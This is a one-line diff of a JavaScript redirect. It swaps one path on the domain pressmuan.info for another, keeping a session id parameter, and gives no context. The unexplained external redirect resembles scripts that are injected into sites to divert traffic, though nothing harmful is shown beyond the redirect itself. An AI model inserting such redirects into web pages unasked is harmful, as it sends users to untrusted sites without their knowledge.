@@ -1,1 +1,1 @@
-window.location.href = "https://pressmuan.info/TJh/go?sid=7744";
+window.location.href = "https://pressmuan.info/DiKqX/go?sid=7744";
